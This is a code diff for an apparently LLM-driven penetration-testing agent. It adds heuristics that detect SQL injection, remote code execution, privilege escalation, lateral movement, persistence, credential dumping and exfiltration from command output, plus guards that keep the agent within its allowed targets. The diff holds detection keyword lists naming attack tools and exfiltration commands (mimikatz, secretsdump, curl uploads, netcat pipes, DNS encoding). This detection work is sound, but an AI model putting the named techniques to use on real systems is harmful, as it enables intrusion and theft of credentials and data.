+            ip_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
+            found_ips = ip_pattern.findall(output or "")
+            # IMPORTANT: derive the "canonical" target from the COMMAND, not from self.target.
+            # In multi-target runs, the LLM may run recon against a different in-scope host than the
+            # current engagement label. Also, if the command is OFF-TARGET, we MUST NOT alias the
+            # resolved IPs to the in-scope target (that can accidentally expand scope).
+            canonical = None
+            try:
+                cmd_targets = [self._normalize_target_token(t) for t in self._extract_targets_from_command(cmd_lower or "")]
+                cmd_targets = [t for t in cmd_targets if t]
+                allowed = set(self.allowed_targets_set or self.allowed_targets or [])
+                # Prefer an explicitly in-scope token from the command.
+                for t in cmd_targets:
+                    if not allowed or t in allowed:
+                        canonical = t
+                        break
+            except Exception:
+                pass
+            # If we can't attribute these IPs to an in-scope command target, do not alias.
+            # Example: `host z.ai` should never map z.ai's public IPs → "juiceshop".
+            if not canonical:
+                return
+            for ip in found_ips:
+                try:
+                    ipaddress.ip_address(ip)
+                except ValueError:
+                    continue
+                # Skip common non-target/loopback/broadcast entries.
+                if ip.startswith("127.") or ip.startswith("0.") or ip == "255.255.255.255":
+                    continue
+                ip_norm = self._normalize_target_token(ip)
+                if ip_norm and ip_norm != canonical and ip_norm not in self.target_aliases:
+                    self._register_target_alias(ip_norm, canonical)
+        except Exception:
+            pass
+
     def _auto_track_vulns_from_execution(self, execution: Execution) -> None:
         """Heuristic vuln detection from real stdout/stderr (evidence-first, low false-positive)."""
         if not execution:
@@ -2989,6 +4015,26 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         if "curl " in cmd_lower or (execution.tool_used or "").lower() == "curl":
             out = self._strip_curl_progress(out)
         out_lower = out.lower()
+        # Many SPAs (including JuiceShop) return an HTML index page for unknown paths with HTTP 200.
+        # Treat HTML-ish responses as weak evidence for file disclosure unless we have strong markers.
+        html_like = any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body", "<title>owasp juice shop"))
+        if not execution.success:
+            self._maybe_register_target_aliases_from_output(cmd_lower, out)
+            return
+        if not out or len(out.strip()) < self.auto_track_min_output_chars:
+            self._maybe_register_target_aliases_from_output(cmd_lower, out)
+            return
+
+        # Ignore tool-install/setup noise that can look like findings.
+        if "apt-get install" in cmd_lower or "pip install" in cmd_lower:
+            return
+        if any(noise in out_lower for noise in ("setting up ", "unpacking ", "selecting previously unselected", "reading package lists")):
+            return
+
+        intent = self._classify_command_intent(cmd_lower)
+        if self.auto_track_require_exploit_intent and intent != "exploit":
+            self._maybe_register_target_aliases_from_output(cmd_lower, out)
+            return
 
         # Helper: detect JWT-like tokens in output
         import re
@@ -3011,18 +4057,34 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             except Exception:
                 payload_lower = ""
 
-        target = self._normalize_target_token(self.target or "") or (self.allowed_targets[0] if self.allowed_targets else "unknown")
-        evidence_snip = out.strip()[:300] if out else "(no output)"
+        # Best-effort: capture the primary URL referenced by this command (useful for playbooks).
+        url_in_cmd = None
+        try:
+            m = re.search(r"(https?://[^\s'\"`]+)", cmd)
+            if m:
+                url_in_cmd = m.group(1).rstrip(").,;]\"'")
+        except Exception:
+            url_in_cmd = None
+
+        # IMPORTANT: attribute findings to the ACTUAL command target (multi-target-safe),
+        # not to the initial engagement label stored in self.target.
+        target = (
+            self._primary_target_for_command(cmd)
+            or self._normalize_target_token(self.target or "")
+            or (self.allowed_targets[0] if self.allowed_targets else "unknown")
+        )
+        evidence_snip = self._redact_sensitive(out.strip()[:300] if out else "(no output)")
 
         # SQLi auth bypass: injection marker + token returned
         inj_markers = ("' or", "or 1=1", "union", "sleep(", "benchmark(", "--", "%27", "%3d", "%3D")
         combined = cmd_lower + "\n" + (payload_lower or "")
         if "curl " in cmd_lower and any(m in combined for m in inj_markers) and ("login" in cmd_lower or "rest/user/login" in cmd_lower):
             if jwts or "\"token\"" in out_lower:
+                loc = url_in_cmd or target
                 self._track_vuln_found(
                     "sql injection",
                     target,
-                    f"Auto-detected SQLi auth bypass from command. Evidence: {evidence_snip}",
+                    f"Auto-detected SQLi auth bypass at {loc}. Evidence: {evidence_snip}",
                 )
                 return
 
@@ -3057,16 +4119,40 @@ Vary your techniques. Do not repeat failed commands. Make progress.
 
         # Information disclosure: exposed backup/secret-ish files under known static areas (e.g., /ftp/*.bak)
         if "curl " in cmd_lower and execution.success:
-            disclosure_exts = (".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z", ".sql", ".db", ".sqlite", ".env")
-            if "/ftp/" in cmd_lower and any(ext in cmd_lower for ext in disclosure_exts):
-                # Avoid tracking empty responses / trivial directory listings only.
-                if out and len(out) >= 80:
-                    self._track_vuln_found(
-                        "information disclosure",
-                        target,
-                        f"Auto-detected exposed file via /ftp. Evidence: {evidence_snip}",
-                    )
-                    return
+            # Avoid SPA "index.html for everything" false positives.
+            if any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body", "<title>owasp juice shop")):
+                self._maybe_register_target_aliases_from_output(cmd_lower, out)
+                return
+
+            disclosure_exts = (
+                ".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z",
+                ".sql", ".db", ".sqlite", ".env",
+                ".yml", ".yaml", ".json", ".conf", ".ini", ".properties", ".log",
+                ".kdbx", ".pem", ".key",
+            )
+            # Ensure the sensitive extension is on the /ftp/ path itself (not elsewhere in a chained command).
+            ftp_paths = re.findall(r"/ftp/[^\s\"']+", cmd_lower)
+            ftp_sensitive = any(any(ext in p for ext in disclosure_exts) for p in ftp_paths)
+            other_sensitive = any(
+                marker in cmd_lower
+                for marker in (
+                    "/.env",
+                    "config.yml",
+                    "config.yaml",
+                    "configuration.yml",
+                    "application.properties",
+                    "database.yml",
+                    "settings.json",
+                )
+            )
+            if (ftp_sensitive or other_sensitive) and out and len(out) >= 80:
+                loc = url_in_cmd or target
+                self._track_vuln_found(
+                    "information disclosure",
+                    target,
+                    f"Auto-detected exposed sensitive file at {loc}. Evidence: {evidence_snip}",
+                )
+                return
 
         # Mass assignment: sending role/admin in JSON with role reflected
         if "curl " in cmd_lower and ("\"role\"" in cmd_lower or "role=admin" in cmd_lower) and (" -d " in cmd_lower or "--data" in cmd_lower):
@@ -3101,25 +4187,483 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                     self._track_vuln_found("file upload", target, detail[:240])
                     return
 
-        # Target alias detection: if nmap/curl output reveals an IP for a known hostname, register alias
-        try:
-            if self.target and ("nmap" in cmd_lower or "host " in cmd_lower or "dig " in cmd_lower or "ping " in cmd_lower):
-                ip_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
-                found_ips = ip_pattern.findall(out)
-                canonical = self._normalize_target_token(self.target)
-                for ip in found_ips:
-                    try:
-                        ipaddress.ip_address(ip)
-                    except ValueError:
-                        continue
-                    # Skip common non-target IPs
-                    if ip.startswith("127.") or ip.startswith("0.") or ip == "255.255.255.255":
-                        continue
-                    ip_norm = self._normalize_target_token(ip)
-                    if ip_norm and ip_norm != canonical and ip_norm not in self.target_aliases:
-                        self._register_target_alias(ip_norm, canonical)
-        except Exception:
-            pass
+        if not self.auto_track_broad_patterns:
+            self._maybe_register_target_aliases_from_output(cmd_lower, out)
+            return
+
+        # ================================================================
+        # BROAD DETECTION PATTERNS (catch findings that narrow patterns miss)
+        # ================================================================
+
+        # Credentials in HTML comments / source code: <!-- password: xxx --> or similar
+        if "curl " in cmd_lower and execution.success and out:
+            cred_patterns = [
+                # HTML comments with passwords/credentials
+                (r'<!--[^>]*(?:password|passwd|pwd|pass|cred|secret|key)\s*[:=]\s*["\']?(\S+)', "credentials in html comments"),
+                # Hardcoded credentials in source (username=X password=Y)
+                (r'(?:default|admin|root).*(?:password|passwd|pwd|pass)\s*[:=]\s*["\']?(\S+)', "default credentials exposed"),
+                # Database connection strings in output
+                (r'(?:connection.?string|dsn|jdbc|sqlserver|mysql|postgres).*(?:password|pwd)\s*[:=]\s*["\']?(\S+)', "database credentials exposed"),
+                # Debug endpoints / command injection hints
+                (r'(?:debug|cmd|exec|shell|command)\s*[?=]', "debug endpoint found"),
+            ]
+            for pattern, vuln_type in cred_patterns:
+                if re.search(pattern, out_lower):
+                    self._track_vuln_found(
+                        vuln_type,
+                        target,
+                        f"Auto-detected {vuln_type} in HTTP response. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # MSSQL/MySQL/PostgreSQL successful connection (impacket, mssqlclient, psql, mysql)
+        # STRICT: prevent false positives from generic HTML tokens like "<h1>" (which contains "1>").
+        db_tools = ("mssqlclient", "impacket-mssqlclient", "mysql", "psql", "sqsh", "tsql")
+        if any(t in cmd_lower for t in db_tools) and execution.success:
+            # If output looks like a web page, do not treat it as DB access.
+            # (But continue evaluating other broad patterns below.)
+            if any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body")):
+                pass
+            else:
+
+                db_prompt_markers = (
+                    "sql>", "mssql>", "mysql>", "sqsh>", "tsql>",
+                    "postgres=#", "postgres=>",
+                    "mariadb [", "mysql [",
+                )
+                # Non-prompt signals that usually only appear after a real authenticated session.
+                db_connection_markers = (
+                    "connected to", "server version", "welcome to the mysql monitor",
+                    "envchange(database)", "changed database context", "changed language setting",
+                    "type \"help\" for help", "type 'help;' for help",
+                    "encryption required, switching to tls",
+                )
+                db_fail_markers = (
+                    "not found", "login failed", "connection refused", "access denied",
+                    "no such file", "error", "timeout", "cannot connect",
+                    "authentication failed", "password authentication failed",
+                    "nt_status_logon_failure", "command not found",
+                )
+                has_prompt = any(m in out_lower for m in db_prompt_markers)
+                conn_hits = sum(1 for m in db_connection_markers if m in out_lower)
+                if (has_prompt or conn_hits >= 2) and not any(m in out_lower for m in db_fail_markers):
+                    # Extract the credential from the command
+                    cred_match = re.search(r"['\"]?(\w+):([^@'\"]+)@", cmd)
+                    cred_str = f"{cred_match.group(1)}:{cred_match.group(2)}" if cred_match else "unknown"
+                    self._track_vuln_found(
+                        "database access",
+                        target,
+                        f"Successful database authentication with {cred_str}. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # SMB/RDP/WinRM successful AUTHENTICATED access (not anonymous listing)
+        # STRICT: require tool-specific auth success markers to avoid false positives from banners/OS strings.
+        smb_tools = ("smbclient", "crackmapexec", "impacket-smbclient", "impacket-psexec", "impacket-wmiexec", "evil-winrm", "xfreerdp", "nxc")
+        if any(t in cmd_lower for t in smb_tools) and execution.success and out:
+            smb_fail = (
+                "nt_status_logon_failure", "nt_status_access_denied",
+                "nt_status_connection_refused", "error", "connection refused",
+                "session setup failed", "access_denied", "logon_failure",
+                "timeout", "timed out",
+                # crackmapexec/nxc failure prefix
+                "[-]",
+            )
+            has_fail = any(m in out_lower for m in smb_fail)
+            if has_fail:
+                return
+
+            is_authenticated = ("-u " in cmd_lower or "-u'" in cmd_lower or "-u\"" in cmd_lower) and "-n" not in cmd.split()
+            is_cme = ("crackmapexec" in cmd_lower) or (" nxc" in cmd_lower) or cmd_lower.strip().startswith("nxc")
+            is_smbclient = "smbclient" in cmd_lower
+            is_evilwinrm = "evil-winrm" in cmd_lower
+
+            auth_success = False
+            try:
+                # CrackMapExec/NXC prints [+] for valid auth and (Pwn3d!) for admin.
+                if is_cme:
+                    # Require a protocol prefix + "[+]" on the same line, or explicit "(Pwn3d!)".
+                    if re.search(r'(?mi)^(SMB|WINRM|RDP)\\s+.+\\[\\+\\]', out) or "(pwn3d!)" in out_lower:
+                        auth_success = True
+                elif is_evilwinrm:
+                    if "evil-winrm" in out_lower and ("ps " in out_lower or "evil-winrm shell" in out_lower):
+                        auth_success = True
+                elif is_smbclient:
+                    # Require interactive prompt or server banner from a real session.
+                    if ("smb: \\>" in out_lower) or ("domain=[" in out_lower and "os=[" in out_lower):
+                        # smbclient can succeed anonymously; require creds usage unless it's a null-session finding.
+                        if is_authenticated:
+                            auth_success = True
+                else:
+                    # Impacket psexec/wmiexec/etc: require command execution evidence.
+                    strong_exec = (
+                        "(pwn3d!)", "nt authority\\system", "nt authority\\\\system",
+                        "c:\\windows", "c:\\users", "command shell", "powershell",
+                        "uid=", "/bin/bash", "/bin/sh",
+                    )
+                    if any(m in out_lower for m in strong_exec):
+                        auth_success = True
+            except Exception:
+                auth_success = False
+
+            if auth_success:
+                self._track_vuln_found(
+                    "remote service access",
+                    target,
+                    f"Authenticated remote service access confirmed. Evidence: {evidence_snip}",
+                )
+                return
+
+        # Command execution / RCE confirmed: output from whoami, id, ipconfig, hostname
+        # STRICT: Requires command injection vector AND actual OS command output (not HTML/error pages)
+        if execution.success and out:
+            rce_indicators = False
+            # Check if command was trying to execute something on target (not local)
+            rce_cmds = ("debug.aspx?cmd=", "cmd=", "exec=", "command=", "shell=", "?c=")
+            rce_shell_cmds = ("psexec", "wmiexec", "evil-winrm", "winrm")
+            is_web_rce = any(r in cmd_lower for r in rce_cmds) and "curl " in cmd_lower
+            is_shell_rce = any(r in cmd_lower for r in rce_shell_cmds)
+            if is_web_rce or is_shell_rce:
+                # For web RCE (cmd injection): require actual command output, not HTML
+                # Must see OS-level output like username, hostname, or system info
+                rce_strong_output = (
+                    "nt authority\\system", "nt authority\\\\system",
+                    "uid=0", "uid=",
+                )
+                # Medium signals: need at least 2 to confirm (avoid false positives from HTML containing "windows")
+                rce_medium_output = (
+                    "ipconfig", "ifconfig", "systeminfo", "net user",
+                    "c:\\windows", "c:\\users", "/bin/bash", "/bin/sh",
+                )
+                rce_fail = (
+                    "<!doctype", "<html", "404", "not found", "error",
+                    "403", "401", "connection refused", "timed out",
+                )
+                has_fail = any(m in out_lower for m in rce_fail)
+                has_strong = any(m in out_lower for m in rce_strong_output)
+                medium_count = sum(1 for m in rce_medium_output if m in out_lower)
+                # Check for actual whoami-like output (not just the word in HTML)
+                # whoami output is typically just a username on a line by itself
+                has_whoami_output = False
+                if "whoami" in cmd_lower or "cmd=whoami" in cmd_lower:
+                    # Output should contain a short username line, not HTTP headers or HTML.
+                    clean_lines = []
+                    for _l in out.splitlines():
+                        s = (_l or "").strip()
+                        if not s:
+                            continue
+                        sl = s.lower()
+                        if s.startswith("<"):
+                            continue
+                        if sl.startswith("http/"):
+                            continue
+                        if any(h in sl for h in ("server:", "date:", "allow:", "content-type:", "content-length:", "location:", "set-cookie:")):
+                            continue
+                        clean_lines.append(s)
+                    for line in clean_lines:
+                        if len(line) > 64:
+                            continue
+                        ll = line.lower()
+                        if ll in ("ok", "success", "true", "false"):
+                            continue
+                        # Windows: DOMAIN\\user or HOST\\user
+                        if re.match(r'^[A-Za-z0-9_.-]+\\\\[A-Za-z0-9_.-]+$', line):
+                            has_whoami_output = True
+                            break
+                        # Linux: username (root, www-data, etc)
+                        if re.match(r'^[a-z_][a-z0-9_-]{0,31}$', ll):
+                            has_whoami_output = True
+                            break
+                if not has_fail and (has_strong or medium_count >= 2 or (has_whoami_output and not has_fail)):
+                    rce_indicators = True
+            if rce_indicators:
+                self._track_vuln_found(
+                    "remote code execution",
+                    target,
+                    f"Command execution confirmed on target. Evidence: {evidence_snip}",
+                )
+                return
+
+        # Default/weak credentials on web apps (POST login with success indicators)
+        if "curl " in cmd_lower and execution.success and ("-x post" in cmd_lower or "-d " in cmd_lower or "--data" in cmd_lower):
+            login_indicators = ("login" in cmd_lower or "auth" in cmd_lower or "signin" in cmd_lower)
+            if login_indicators:
+                # STRICT: require strong login success evidence, not just any HTTP response
+                strong_success = (
+                    "dashboard", "welcome", "logged in", "success",
+                    "authenticated", "admin panel",
+                )
+                # Weak signals need at least 2 to count
+                weak_success = (
+                    "set-cookie", "token", "302",
+                )
+                fail_markers = (
+                    "invalid", "incorrect", "failed", "error", "wrong password",
+                    "unauthorized", "403", "401", "denied", "not found",
+                    "<!doctype", "<html", "using http",
+                )
+                has_strong = any(m in out_lower for m in strong_success)
+                weak_count = sum(1 for m in weak_success if m in out_lower)
+                has_fail = any(m in out_lower for m in fail_markers)
+                if not has_fail and (has_strong or weak_count >= 2):
+                    self._track_vuln_found(
+                        "default credentials",
+                        target,
+                        f"Successful web login with credentials. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # Open/anonymous access: FTP anon, SMB null session, unauthenticated API
+        if execution.success and out:
+            # FTP anonymous
+            if ("ftp" in cmd_lower) and ("anonymous" in cmd_lower or "-n" in cmd_lower):
+                if "230" in out or "login successful" in out_lower or "directory" in out_lower:
+                    self._track_vuln_found(
+                        "anonymous access",
+                        target,
+                        f"Anonymous FTP access confirmed. Evidence: {evidence_snip}",
+                    )
+                    return
+            # SMB null session
+            if "smbclient" in cmd_lower and ("-n" in cmd_lower or "'-'" in cmd_lower or "''" in cmd_lower or "-N" in cmd):
+                if "sharename" in out_lower or "disk" in out_lower:
+                    self._track_vuln_found(
+                        "null session",
+                        target,
+                        f"SMB null session access confirmed. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # Sensitive data in nmap scripts (ms-sql-info, smb-os-discovery, http-title, etc.)
+        if "nmap" in cmd_lower and execution.success and ("--script" in cmd_lower or "-sc" in cmd_lower or "-sv" in cmd_lower):
+            if "ms-sql-info" in out_lower and ("version" in out_lower or "tcp port" in out_lower):
+                self._track_vuln_found(
+                    "information disclosure",
+                    target,
+                    f"MSSQL service information exposed. Evidence: {evidence_snip}",
+                )
+                # Don't return — let other nmap checks also fire
+
+        # ================================================================
+        # PRIVILEGE ESCALATION DETECTION
+        # ================================================================
+
+        # Privesc confirmed: went from regular user to admin/SYSTEM/root
+        if execution.success and out:
+            privesc_tools = ("psexec", "wmiexec", "getsystem", "sudo", "doas", "pkexec",
+                            "runas", "schtasks", "at.exe", "sc.exe", "juicypotato",
+                            "printspoofer", "godpotato", "sweetpotato", "roguepotato",
+                            "winpeas", "linpeas", "beroot", "seatbelt")
+            if any(t in cmd_lower for t in privesc_tools):
+                privesc_markers = (
+                    "nt authority\\system", "nt authority\\\\system",
+                    "root", "uid=0", "administrator",
+                    "privilege escalation", "getsystem",
+                    "successfully", "impersonat",
+                )
+                if any(m in out_lower for m in privesc_markers):
+                    self._track_vuln_found(
+                        "privilege escalation",
+                        target,
+                        f"Privilege escalation confirmed. Evidence: {evidence_snip}",
+                    )
+                    return
+
+            # Token/impersonation based privesc (Windows)
+            if ("token" in cmd_lower or "impersonate" in cmd_lower or "potato" in cmd_lower):
+                if "nt authority" in out_lower or "system" in out_lower:
+                    self._track_vuln_found(
+                        "privilege escalation",
+                        target,
+                        f"Token impersonation privesc confirmed. Evidence: {evidence_snip}",
+                    )
+                    return
+
+            # sudo/SUID misconfiguration
+            if ("sudo -l" in cmd_lower or "find.*-perm.*4000" in cmd_lower or "suid" in cmd_lower):
+                if "(all)" in out_lower or "(root)" in out_lower or "nopasswd" in out_lower:
+                    self._track_vuln_found(
+                        "privilege escalation",
+                        target,
+                        f"Sudo/SUID misconfiguration found. Evidence: {evidence_snip}",
+                    )
+                    return
+
+            # Windows: unquoted service paths, weak permissions, AlwaysInstallElevated
+            if execution.success and ("sc qc" in cmd_lower or "accesschk" in cmd_lower or "icacls" in cmd_lower or "wmic" in cmd_lower):
+                weak_markers = ("everyone", "users.*full", "authenticated users.*modify",
+                               "alwaysinstallelevated", "unquoted", "service_all_access")
+                if any(m in out_lower for m in weak_markers):
+                    self._track_vuln_found(
+                        "privilege escalation",
+                        target,
+                        f"Windows privilege escalation vector found. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # ================================================================
+        # LATERAL MOVEMENT DETECTION
+        # ================================================================
+        if execution.success and out:
+            lateral_tools = ("psexec", "wmiexec", "smbexec", "atexec", "dcomexec",
+                           "evil-winrm", "xfreerdp", "rdesktop", "pth-winexe",
+                           "impacket-psexec", "impacket-wmiexec",
+                           "impacket-smbexec", "impacket-atexec", "impacket-dcomexec")
+            # Note: ssh/smbclient/crackmapexec removed — they're recon tools, not lateral movement
+            # unless they actually achieve shell access
+            pth_markers = ("-hashes", "pass.the.hash", "pth", ":aad3b435", "lm:", "ntlm:")
+            is_pth = any(m in cmd_lower for m in pth_markers)
+            if any(t in cmd_lower for t in lateral_tools):
+                # STRICT: require actual shell/command execution evidence
+                lateral_strong_success = (
+                    "c:\\windows", "c:\\users", "ps c:\\",
+                    "nt authority", "command shell", "powershell",
+                    "/root", "/home/", "uid=", "(pwn3d!)",
+                    "shell access", "opened session",
+                )
+                lateral_fail = (
+                    "nt_status_logon_failure", "nt_status_access_denied",
+                    "access_denied", "logon_failure", "connection refused",
+                    "error", "timeout", "timed out", "failed",
+                    "not found", "no such file", "permission denied",
+                )
+                has_strong = any(m in out_lower for m in lateral_strong_success)
+                has_fail = any(m in out_lower for m in lateral_fail)
+                if has_strong and not has_fail:
+                    move_type = "pass-the-hash lateral movement" if is_pth else "lateral movement"
+                    self._track_vuln_found(
+                        move_type,
+                        target,
+                        f"Lateral movement confirmed. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # ================================================================
+        # PERSISTENCE DETECTION
+        # ================================================================
+        if execution.success and out:
+            # Scheduled tasks / registry / services for persistence
+            persist_cmds = ("schtasks /create", "reg add", "sc create", "new-service",
+                          "crontab", "systemctl enable", ".bashrc", ".profile",
+                          "startup", "run key", "useradd", "net user.*add",
+                          "backdoor", "webshell", "reverse.*shell")
+            if any(p in cmd_lower for p in persist_cmds):
+                persist_success = ("success", "created", "added", "enabled", "the command completed",
+                                  "user.*added", "account.*created")
+                if any(m in out_lower for m in persist_success):
+                    self._track_vuln_found(
+                        "persistence",
+                        target,
+                        f"Persistence mechanism established. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # ================================================================
+        # COLLECTION & DATA ACCESS DETECTION
+        # ================================================================
+        if execution.success and out:
+            # SAM/NTDS/shadow/credential dump
+            dump_tools = ("secretsdump", "mimikatz", "hashdump", "lsadump",
+                        "ntds.dit", "sam", "system.hiv", "security.hiv",
+                        "pypykatz", "impacket-secretsdump", "reg save")
+            if any(t in cmd_lower for t in dump_tools):
+                dump_markers = ("$ntlm$", "aad3b435", ":::", "nthash",
+                              "password", "hash", "credential", "secret",
+                              "sam hive", "dpapi", "lsa secrets")
+                if any(m in out_lower for m in dump_markers):
+                    self._track_vuln_found(
+                        "credential dumping",
+                        target,
+                        f"Credential dump successful. Evidence: {evidence_snip}",
+                    )
+                    return
+
+            # Database dumps / sensitive file reads
+            if execution.success and len(out) > 200:
+                # Large data reads that look like dumps
+                db_dump_markers = ("insert into", "create table", "select *",
+                                 "| id |", "+----+", "rows in set",
+                                 "column_name", "table_schema")
+                if any(m in out_lower for m in db_dump_markers):
+                    self._track_vuln_found(
+                        "data collection",
+                        target,
+                        f"Database data extracted. Evidence: {evidence_snip}",
+                    )
+                    return
+
+            # Sensitive file access (Windows/Linux)
+            win_sensitive = ("sam", "ntds", "web.config", "unattend.xml",
+                           "sysprep", "groups.xml", "scheduledtasks.xml",
+                           "shadow", "passwd", ".ssh/id_rsa", "credentials",
+                           "password.txt", "flag.txt", "proof.txt")
+            file_read_cmds = ("type ", "cat ", "get ", "more ", "head ", "tail ")
+            if any(c in cmd_lower for c in file_read_cmds) and any(f in cmd_lower for f in win_sensitive):
+                # STRICT: require actual file content, not error messages or tool installation output
+                file_fail = (
+                    "not found", "no such file", "access denied", "permission denied",
+                    "cannot find", "error", "apt-get", "dpkg", "installing",
+                    "setting up", "unpacking", "selecting previously",
+                )
+                has_file_fail = any(m in out_lower for m in file_fail)
+                # Must have reasonable content (not just error text)
+                has_content = len(out.strip()) > 20 and not has_file_fail
+                if has_content:
+                    self._track_vuln_found(
+                        "sensitive data access",
+                        target,
+                        f"Sensitive file read confirmed. Evidence: {evidence_snip}",
+                    )
+                    return
+
+        # ================================================================
+        # EXFILTRATION DETECTION
+        # ================================================================
+        if execution.success and out:
+            # Data being sent out via curl/wget/nc/dns/etc
+            # STRICT: require evidence of actual data transfer, not just running a tool
+            exfil_confirmed = False
+            exfil_fail = ("connection refused", "timed out", "error", "failed", "not found", "0 bytes")
+            has_exfil_fail = any(m in out_lower for m in exfil_fail)
+            if not has_exfil_fail:
+                if ("curl " in cmd_lower or "wget " in cmd_lower or "nc " in cmd_lower or "ncat " in cmd_lower):
+                    # Must be uploading data (not downloading/fetching)
+                    # Must be uploading/sending data (not downloading/fetching).
+                    is_upload = False
+                    if "curl " in cmd_lower:
+                        # Note: curl "-T" becomes "-t" after lowercasing; keep it curl-scoped to avoid collisions.
+                        is_upload = (
+                            "--upload-file" in cmd_lower
+                            or " -t " in cmd_lower
+                            or "--data-binary @" in cmd_lower
+                            or " --data @" in cmd_lower
+                            or " | curl" in cmd_lower
+                        )
+                    if (" | nc" in cmd_lower or " | ncat" in cmd_lower):
+                        is_upload = True
+                    # Must have success indicators in output (silent output is not proof).
+                    upload_success = ("uploaded", "transferred", "bytes", "100%", "complete", "saved", "written", "putting file", "stored")
+                    marker_hits = sum(1 for m in upload_success if m in out_lower)
+                    has_upload_success = ("putting file" in out_lower) or ("100%" in out_lower) or (marker_hits >= 2)
+                    if is_upload and has_upload_success:
+                        exfil_confirmed = True
+                # DNS exfiltration — require encoded data in query
+                if ("nslookup" in cmd_lower or "dig " in cmd_lower):
+                    if any(enc in cmd_lower for enc in ("base64", "hex", "xxd", "$(cat")):
+                        exfil_confirmed = True
+                # SMB exfiltration (copying files to attacker share)
+                if "smbclient" in cmd_lower and ("put " in cmd_lower or "mput " in cmd_lower):
+                    if "putting file" in out_lower or "nt_status" not in out_lower:
+                        exfil_confirmed = True
+            if exfil_confirmed:
+                self._track_vuln_found(
+                    "data exfiltration",
+                    target,
+                    f"Data exfiltration confirmed. Evidence: {evidence_snip}",
+                )
+                return
+
+        self._maybe_register_target_aliases_from_output(cmd_lower, out)
     
     def _build_feedback(self, execution: Execution) -> str:
         """Build feedback message for LLM - includes state tracking hints"""
@@ -3303,6 +4847,10 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         """
         Extract [REMEMBER: category] content from AI response and save to memory.
         AI decides what's worth remembering.
+        
+        IMPORTANT: The content extracted here comes from the LLM response, which may
+        contain internal reasoning/monologue mixed with factual findings. We strip
+        LLM reasoning before storing to prevent hallucinated evidence in findings.
         """
         if not self.memory_store:
             return
@@ -3317,6 +4865,9 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             content = content.strip()
             
             if content:
+                # Strip LLM reasoning/internal monologue before evidence gate and storage
+                content = self._strip_llm_reasoning(content)
+                
                 if not self._evidence_gate_ok(category, content):
                     self._log(f"Memory rejected (missing evidence): [{category}] {content[:60]}...", "WARN")
                     continue
@@ -3329,7 +4880,7 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                 if memory:
                     self._log(f"Memory saved: [{category}] {content[:50]}...")
                     # Track vulns for mandatory exploitation
-                    if category in ["vulnerability_found", "access_gained"]:
+                    if category in ["vulnerability_found", "access_gained", "credential_found"]:
                         self._extract_vulns_from_memory(content)
     
     def _auto_extract_learnings(self, execution: Execution):
@@ -3372,6 +4923,42 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             out_lower = out.lower()
             if not execution.success:
                 return
+
+            # Command injection proof (DVWA-style) — if we see uid= and the exec endpoint is involved,
+            # auto-track and mark proven even if the vuln wasn't explicitly tracked yet.
+            try:
+                if "/vulnerabilities/exec" in cmd_lower and re.search(r"\\buid=\\d+\\b", out_lower):
+                    vid = self._pick_matching_vuln_id(["command injection", "cmdi", "rce", "remote code"])
+                    if not vid:
+                        # Create a new vuln record anchored to this target.
+                        self._track_vuln_found("command injection", (self.target or "unknown"), "Auto-proof: uid=... from /vulnerabilities/exec")
+                        vid = self._pick_matching_vuln_id(["command injection", "cmdi", "rce", "remote code"])
+                    if vid and not (self.vulns_found.get(vid) or {}).get("exploited"):
+                        proof = self._redact_sensitive(out[:500])
+                        self._record_vuln_attempt(vid, execution)
+                        self._mark_vuln_proven(vid, f"cmd: {self._redact_sensitive(cmd[:400])}\noutput:\n{proof}"[:800])
+                        return
+            except Exception:
+                pass
+
+            # SQL injection proof (DVWA-style) — key off the /vulnerabilities/sqli endpoint.
+            # Require at least one clear record marker (First name/Surname) or a leaked hash.
+            try:
+                if "/vulnerabilities/sqli" in cmd_lower:
+                    markers = ("first name:", "surname:", "id:", "user:", "password:", "md5")
+                    hash_leak = bool(re.search(r"\\b[a-f0-9]{32}\\b", out_lower))
+                    if any(m in out_lower for m in markers) or hash_leak:
+                        vid = self._pick_matching_vuln_id(["sql injection", "sqli", "sql"])
+                        if not vid:
+                            self._track_vuln_found("sql injection", (self.target or "unknown"), "Auto-proof: output markers from /vulnerabilities/sqli")
+                            vid = self._pick_matching_vuln_id(["sql injection", "sqli", "sql"])
+                        if vid and not (self.vulns_found.get(vid) or {}).get("exploited"):
+                            proof = self._redact_sensitive(out[:500])
+                            self._record_vuln_attempt(vid, execution)
+                            self._mark_vuln_proven(vid, f"cmd: {self._redact_sensitive(cmd[:400])}\noutput:\n{proof}"[:800])
+                            return
+            except Exception:
+                pass
 
             # Path traversal / LFI evidence
             if ("/ftp/" in cmd_lower or "../" in cmd_lower) and len(out) >= 80:
@@ -3539,13 +5126,51 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                 )
             
             # Add relevant memories from previous sessions
+            # IMPORTANT: Filter out memories referencing out-of-scope targets to prevent
+            # the agent from attacking wrong hosts (e.g., DVWA at 172.21.0.2 from prior runs)
             if self.memory_store:
                 memory_context = create_memory_prompt_section(
                     self.memory_store, 
                     context_keywords=[target.split(':')[0], 'credential', 'vulnerability', 'tool']
                 )
                 if memory_context:
-                    initial_prompt += f"\n{memory_context}\n\n"
+                    # Filter out lines referencing IPs/hosts not in our allowed targets
+                    allowed_set = self.allowed_targets_set or set(self.allowed_targets)
+                    if allowed_set:
+                        filtered_lines = []
+                        import re as _mem_re
+                        for line in memory_context.split('\n'):
+                            # Extract any IPs from the line
